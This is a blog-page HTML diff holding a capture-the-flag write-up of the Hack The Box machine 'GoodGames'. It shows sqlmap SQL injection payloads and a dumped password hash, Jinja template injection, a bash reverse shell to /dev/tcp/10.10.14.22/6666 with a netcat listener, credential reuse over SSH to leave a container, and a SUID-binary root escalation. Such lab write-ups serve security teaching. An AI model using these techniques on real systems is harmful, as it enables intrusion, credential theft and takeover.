@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+
+<html lang="en">
+  <head>
+    <link rel="stylesheet" href="/_assets/css/styles.css"> 
+    <meta charset="utf-8">
+    <title>GoodGames Writeup</title>
+  </head>
+  <body class="page-body">
+    <div class="page-body-container">
+      <div class="page-body-content-container">
+        <!-- <h2 class="back-button">&#8592;</h2> -->
+        <header class="post-header-container">
+    <h1 class="header-logo-div">
+        <a href=/ class="header-logo">soh3ee</a>
+    </h1>
+    <nav class="header-items">
+        <a class="header-item">dontclick</a>
+    </nav>
+</header>
+        <h1 class="page-title">GoodGames Writeup</h1>
+        
+        
+        
+        
+        <p class="page-date-author-readtime">March 24, 2023 | 11 minutes </p>
+      
+        
+<p>GoodGames was an easy rated box featuring a login page that called unsanitized queries and server side template injection (SSTI). I feel like this box reinforces your fundamentals such as using automated tooling like SQLmap, being weary of any data entry fields, and a touch into the concept of containers (I had never escaped one before this box!).</p>
+<h2 id="tcp-nmap-scan">TCP Nmap Scan</h2>
+
+<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">o</span> <span class="n">goodgames</span><span class="p">.</span><span class="n">txt</span> <span class="c1">--min-rate=10000 10.10.11.130</span>
+<span class="n">Warning</span><span class="p">:</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">130</span> <span class="n">giving</span> <span class="n">up</span> <span class="n">on</span> <span class="n">port</span> <span class="n">because</span> <span class="n">retransmission</span> <span class="n">cap</span> <span class="n">hit</span> <span class="p">(</span><span class="mi">10</span><span class="p">).</span>
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">11</span><span class="p">.</span><span class="mi">130</span>
+<span class="n">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">086</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
+<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">64418</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">conn</span><span class="o">-</span><span class="n">refused</span><span class="p">),</span> <span class="mi">1116</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
+<span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">http</span>    <span class="n">Apache</span> <span class="n">httpd</span> <span class="mi">2</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">51</span>
+<span class="err">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">GoodGames</span> <span class="err">|</span> <span class="n">Community</span> <span class="ow">and</span> <span class="n">Store</span>
+<span class="err">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Werkzeug</span><span class="o">/</span><span class="mi">2</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">2</span> <span class="n">Python</span><span class="o">/</span><span class="mi">3</span><span class="p">.</span><span class="mi">9</span><span class="p">.</span><span class="mi">2</span>
+<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">goodgames</span><span class="p">.</span><span class="n">htb</span>
+
+<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="p">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="p">.</span>
+<span class="o">#</span> <span class="n">Nmap</span> <span class="n">done</span> <span class="n">at</span> <span class="n">Tue</span> <span class="n">Mar</span> <span class="mi">21</span> <span class="mi">15</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">24</span> <span class="mi">2023</span> <span class="c1">-- 1 IP address (1 host up) scanned in 27.49 seconds</span>
+</code></pre></div></div>
+<p>I added <code class="language-plaintext highlighter-rouge">goodgames.htb</code> to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+
+<p>I noticed that there was some information about the technology the site was using: <code class="language-plaintext highlighter-rouge">Werkezeug/2.0.2 Python/3.9.2</code>. <code class="language-plaintext highlighter-rouge">Werkzeug</code> caught my eyes– I searched up “Werkzeug 2.0.2 exploits”. HackTricks said that if debug is enabled, there could be a URI to the console with <code class="language-plaintext highlighter-rouge">/console</code>. When I read that, I thought it would be my initial access, but unfortunately I just got a 404 error X_X.</p>
+
+<p>Moving on, I tried clicking around the site and analyzed the requests that the site was sending with Burpsuite. I looked at the requests and replies, but nothing really caught my eye. Eventually, I saw myself back at the login page, in which I came to my last resort: SQL injection. I used <code class="language-plaintext highlighter-rouge">burpsuite</code> to confirm the URI path and data parameters:</p>
+
+<p><img src="/_assets/images/writeups/2023-03-24-goodgames.md/burpsuite.png" alt="" /></p>
+
+<h3 id="sqlmap-payload">Sqlmap Payload</h3>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s1">'http://goodgames.htb/login'</span> <span class="nt">--data</span><span class="o">=</span><span class="s2">"email=test@gmail.com&amp;password=test"</span> <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">-f</span> <span class="nt">--banner</span> │ <span class="nt">--ignore-code</span> 401
+</code></pre></div></div>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sqlmap</span> <span class="n">identified</span> <span class="n">the</span> <span class="k">following</span> <span class="n">injection</span> <span class="n">point</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="k">with</span> <span class="n">a</span> <span class="n">total</span> <span class="k">of</span> <span class="mi">235</span> <span class="n">HTTP</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">requests</span><span class="p">:</span>
+<span class="c1">---</span>
+<span class="k">Parameter</span><span class="p">:</span> <span class="n">email</span> <span class="p">(</span><span class="n">POST</span><span class="p">)</span>
+    <span class="k">Type</span><span class="p">:</span> <span class="nb">boolean</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span>
+    <span class="n">Title</span><span class="p">:</span> <span class="k">OR</span> <span class="nb">boolean</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span> <span class="o">-</span> <span class="k">WHERE</span> <span class="k">or</span> <span class="k">HAVING</span> <span class="n">clause</span> <span class="p">(</span><span class="k">NOT</span><span class="p">)</span>
+    <span class="n">Payload</span><span class="p">:</span> <span class="n">email</span><span class="o">=</span><span class="n">test</span><span class="o">@</span><span class="n">gmail</span><span class="p">.</span><span class="n">com</span><span class="s1">' OR NOT 9443=9443-- ivUO&amp;password=test
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: email=test@gmail.com'</span> <span class="k">AND</span> <span class="p">(</span><span class="k">SELECT</span> <span class="mi">7414</span> <span class="k">FROM</span> <span class="p">(</span><span class="k">SELECT</span><span class="p">(</span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">)))</span><span class="n">yOWp</span><span class="p">)</span><span class="c1">-- sdlr&amp;password=test</span>
+
+    <span class="k">Type</span><span class="p">:</span> <span class="k">UNION</span> <span class="n">query</span>
+    <span class="n">Title</span><span class="p">:</span> <span class="n">Generic</span> <span class="k">UNION</span> <span class="n">query</span> <span class="p">(</span><span class="k">NULL</span><span class="p">)</span> <span class="o">-</span> <span class="mi">4</span> <span class="n">columns</span>
+    <span class="n">Payload</span><span class="p">:</span> <span class="n">email</span><span class="o">=</span><span class="n">test</span><span class="o">@</span><span class="n">gmail</span><span class="p">.</span><span class="n">com</span><span class="s1">' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a787071,0x4e5a62544f6d427a58487362544646664f4e766361584b755948474e6a63426d494f474b744c736d,0x716b707171)-- -&amp;password=test
+---
+[21:45:25] [INFO] testing MySQL
+[21:45:26] [INFO] confirming MySQL
+[21:45:26] [INFO] the back-end DBMS is MySQL
+[21:45:26] [INFO] fetching banner
+[21:45:27] [INFO] executing MySQL comment injection fingerprint
+back-end DBMS: active fingerprint: MySQL &gt;= 8.0.0
+               comment injection fingerprint: MySQL 8.0.27
+banner: '</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">27</span><span class="s1">'
+[21:45:27] [INFO] fetched data logged to text files under '</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">sohee</span><span class="o">/</span><span class="p">.</span><span class="k">local</span><span class="o">/</span><span class="k">share</span><span class="o">/</span><span class="n">sqlmap</span><span class="o">/</span><span class="k">output</span><span class="o">/</span><span class="n">goodgames</span><span class="p">.</span><span class="n">htb</span><span class="s1">'
+
+[*] ending @ 21:45:27 /2023-03-22/
+
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">sqlmap</code> attack was successful. To then access the database, I passed the <code class="language-plaintext highlighter-rouge">--dump</code> flag to the same command like so:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s1">'http://goodgames.htb/login'</span> <span class="nt">--data</span><span class="o">=</span><span class="s2">"email=test@gmail.com&amp;password=test"</span> <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">-f</span> <span class="nt">--banner</span> │ <span class="nt">--ignore-code</span> 401 <span class="nt">--dump</span>
+</code></pre></div></div>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Database</span><span class="p">:</span> <span class="n">main</span>
+<span class="k">Table</span><span class="p">:</span> <span class="k">user</span>
+<span class="p">[</span><span class="mi">1</span> <span class="n">entry</span><span class="p">]</span>
+<span class="o">+</span><span class="c1">----+-------+---------------------+----------------------------------+</span>
+<span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">name</span>  <span class="o">|</span> <span class="n">email</span>               <span class="o">|</span> <span class="n">password</span>                         <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+-------+---------------------+----------------------------------+</span>
+<span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="k">admin</span> <span class="o">|</span> <span class="k">admin</span><span class="o">@</span><span class="n">goodgames</span><span class="p">.</span><span class="n">htb</span> <span class="o">|</span> <span class="mi">2</span><span class="n">b22337f218b2d82dfc3b6f77e7cb8ec</span> <span class="o">|</span>
+<span class="o">+</span><span class="c1">----+-------+---------------------+----------------------------------+</span>
+</code></pre></div></div>
+<p>Creds &lt;3 But I noticed the password was hashed, although it was just a simple MD5 hash. One could pass this hash into a hash cracker like CyberChef and used the “Magic” option to discover the type of hash, but I was able to recognize it and passed it into Crackstation.</p>
+
+<p><img src="/_assets/images/writeups/2023-03-24-goodgames.md/crackstation.png" alt="" /></p>
+
+<h2 id="initial-access">Initial Access</h2>
+<p>Using these creds, I logged in to the login page I attacked. After clicking around the new portal, I noticed that one of the links (the gear icon) took me to a new vhost: <code class="language-plaintext highlighter-rouge">internal-administration.goodgames.htb</code>.</p>
+
+<p><img src="/_assets/images/writeups/2023-03-24-goodgames.md/gearicon.png" alt="" /></p>
+
+<p><img src="/_assets/images/writeups/2023-03-24-goodgames.md/vhost.png" alt="" /></p>
+
+<p>I added it to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and arrived at another login portal. The first thing I noticed was that this login portal expected different types of credentials. The previous one had been an email, but this one expected a username. Before doing any more deep diving, I tried the same credentials, but in the username, I removed the domain.</p>
+
+<p><img src="/_assets/images/writeups/2023-03-24-goodgames.md/flasklogincreds.png" alt="" /></p>
+
+<h3 id="ssti-in-flaskjinja">SSTI in Flask/Jinja</h3>
+<p>More than specifically seeing any potential on this “General Information” page, I used process of elimination, as the other links or buttons had no meaningful action. 
+<em>I often look for keywords that hint at names of technologies and even their versions</em>
+On top of the fact that I could probably exploit the input boxes, I also saw “Flask Volt Dashboard” in the order of the page. So I searched: “Flask Volt Dashboard exploit”.</p>
+
+<p><img src="/_assets/images/writeups/2023-03-24-goodgames.md/dashboard.png" alt="" /></p>
+
+<p>I came across this post: https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/
+Reading this post made me understand that I could possibly exploit a template that directly called data from a database. Therefore rather than passing the expected data, in this case, a “Full Name”, I could pass data in Jinja’s syntax, that would execute as my payload.</p>
+
+<p>So I tried it:</p>
+
+<p><img src="/_assets/images/writeups/2023-03-24-goodgames.md/flasklogincreds.png" alt="" /></p>
+
+<p>And wah-lah, it worked :P! After having POC (Proof of Concept), I used the following exploit to obtain RCE (Remote Code Execution), that would grab a file containing commands for a reverse shell from my attacking machine.</p>
+<ol>
+  <li>Configure the revshell executable to be grabbed:
+    <ul>
+      <li>Create a file called <code class="language-plaintext highlighter-rouge">revshell</code></li>
+      <li>Populate with:
+        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> #!/bin/bash
+ -c "bash -i &gt;&amp; /dev/tcp/10.10.14.22/6666 0&gt;&amp;1"
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+  <li>Set up the listener: <code class="language-plaintext highlighter-rouge">nc -lvnp 6666</code></li>
+  <li>Set up the web server: <code class="language-plaintext highlighter-rouge">python3 -m http.server 80</code></li>
+  <li>Submit the request with the payload as the “Full Name”: ``</li>
+</ol>
+
+<p>And there was my shell! But ew, what the fudge, it looks like I’m in a container ):</p>
+
+<p><img src="/_assets/images/writeups/2023-03-24-goodgames.md/container.png" alt="" /></p>
+
+<h3 id="escaping-the-container">Escaping the Container</h3>
+<p>The first thing I did was look around the container. I had landed in <code class="language-plaintext highlighter-rouge">/backend/</code> when I initiated the shell. I looked around but never found anything actually important.</p>
+
+<p>I then progressed to <code class="language-plaintext highlighter-rouge">linpeas</code>. Although it wasn’t highlighted, I notice that there was a user in the home directory?!</p>
+
+<p><img src="/_assets/images/writeups/2023-03-24-goodgames.md/augustus.png" alt="" /></p>
+
+<p>I was able to read <code class="language-plaintext highlighter-rouge">user.txt</code>, but the thing I was more concerned about was how <code class="language-plaintext highlighter-rouge">/home/augustus</code> existed without being a defined uesr in <code class="language-plaintext highlighter-rouge">/etc/passwd</code> <strong>in the container</strong>.
+<code class="language-plaintext highlighter-rouge">cat /etc/passwd</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+</code></pre></div></div>
+
+<p>After looking more into containers, I learned that host machines can mount their directories to the container. Although I couldn’t yet do anything with this information yet, it would come in handy down the line.</p>
+
+<p>This was my first time having to break out of a container, so Brice told me a bit of information regarding Docker containers and the connection between it and the host machine:
+    - The host machine behaves as a gateway between the docker container and itself, therefore the default gateway of the network is a vector in which we can communicate from the container to the host (using 172.19.0.1)</p>
+
+<p>Using this information, I imported an <code class="language-plaintext highlighter-rouge">nmap</code> binary from my host machine to the container and scanned the host machine. 
+<em>Make sure you are in a writeable directory, and to give the executable the correct permissions (<code class="language-plaintext highlighter-rouge">chmod +x</code>)</em>
+<code class="language-plaintext highlighter-rouge">./nmap -p- 172.19.0.1 --minrate=5000</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-23 07:49 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 172.19.0.1
+Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
+Host is up (0.000030s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 02:42:3B:D3:F2:F7 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned in 34.58 seconds
+</code></pre></div></div>
+
+<p>At this moment is when I should have put the three pieces together: I <strong>assumed</strong> user <code class="language-plaintext highlighter-rouge">augustus</code> existed on the host machine because it was <strong>likely</strong> mounted, as it did not appear to exist in <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, I had some creds, and <code class="language-plaintext highlighter-rouge">ssh</code> was open!</p>
+
+<p>After more useless rummaging on the container, I eventually said “what if I just try the same creds, but with the user <code class="language-plaintext highlighter-rouge">augustus</code>?</p>
+
+<p>And this is when I had my biggest takeway from this box. No matter how much you might think “there’s no way it’s the same creds AGAIN”, try, because you really never know.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh augustus@172.19.0.1
+Pseudo-terminal will not be allocated because stdin is not a terminal.
+Host key verification failed.
+</code></pre></div></div>
+<p>LOL, you gotta get an interactive shell first x_x
+My usual go-to command for that is: <code class="language-plaintext highlighter-rouge">python3 -c 'import pty; pty.spawn("/bin/bash")'</code>
+Finally:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh augustus@172.19.0.1
+The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
+Are you sure you want to continue connecting (yes/no)? yes
+yes
+Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
+augustus@172.19.0.1's password: superadministrator 
+
+Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+augustus@GoodGames:~$ 
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Looking at the output of <code class="language-plaintext highlighter-rouge">ps aux</code>, I noticed something a bit suspicious. Although I wasn’t entirely familiar with how Docker containers functioned in correlation with their host machines, I knew this was odd. All the commands being run on the container were being run as <code class="language-plaintext highlighter-rouge">root</code> on the host machine!</p>
+
+<p><img src="/_assets/images/writeups/2023-03-24-goodgames.md/everythingroot.png" alt="" /></p>
+
+<p>It’s a bit hard to see, but the Python interactive shell command I just ran is being run as <code class="language-plaintext highlighter-rouge">root</code>. Knowing this, my thought and step process was the following:</p>
+<ol class="numbered-list">
+  <li>Go back into the container</li>
+</ol>
+
+<ol start="2" class="numbered-list">
+  <li>Copy a <code class="language-plaintext highlighter-rouge">cat</code> binary into the mounted user <code class="language-plaintext highlighter-rouge">augustus</code> directory which would be owned by <code class="language-plaintext highlighter-rouge">root</code></li>
+</ol>
+<p><code class="language-plaintext highlighter-rouge">cp /usr/bin cat</code></p>
+
+<p><img src="/_assets/images/writeups/2023-03-24-goodgames.md/catbinary.png" alt="" /></p>
+
+<ol start="3" class="numbered-list">
+  <li>Set the SUID 
+Set the SUID on the binary to allow execution as <code class="language-plaintext highlighter-rouge">root</code> despite not being <code class="language-plaintext highlighter-rouge">root</code></li>
+</ol>
+<p><code class="language-plaintext highlighter-rouge">chmod +s cat</code></p>
+
+<p><img src="/_assets/images/writeups/2023-03-24-goodgames.md/catbinary.png" alt="" /></p>
+
+<ol start="4" class="numbered-list">
+  <li>SSH 
+SSH in back into the host machine and read <code class="language-plaintext highlighter-rouge">/root/root.txt</code> <strong>with the mounted <code class="language-plaintext highlighter-rouge">cat</code> binary</strong>
+<code class="language-plaintext highlighter-rouge">/home/augustus/cat /root/root.txt</code></li>
+</ol>
+
+<p><img src="/_assets/images/writeups/2023-03-24-goodgames.md/root.png" alt="" /></p>
+
+
+
+        
+      </div>
+      
+      
+      
+  </div> <!-- page-body-container END-->
+  </body>
+  <script>
+  $(document).ready(function() {
+  var toc = $("#toc"); // target the table of contents element
+  var tocEntries = toc.find("a"); // target the links within the table of contents
+  
+  $(window).scroll(function() {
+    // get the current scroll position of the window
+    var currentPosition = $(this).scrollTop();
+    
+    // loop through each link in the table of contents
+    tocEntries.each(function() {
+      // get the ID of the section of content that this link points to
+      var target = $(this).attr("href");
+      
+      // use the ID to target the corresponding section of content
+      var section = $(target);
+      
+      // if the section exists and its top position is within the current viewport
+      if (section.length && section.offset().top <= currentPosition + 200) {
+        // remove the active class from all links in the table of contents
+        tocEntries.removeClass("active");
+        
+        // add the active class to the link that corresponds to the current section
+        $(this).addClass("active");
+      }
+    });
+  });
+  });
+
+  </script>
+
+</html>
+
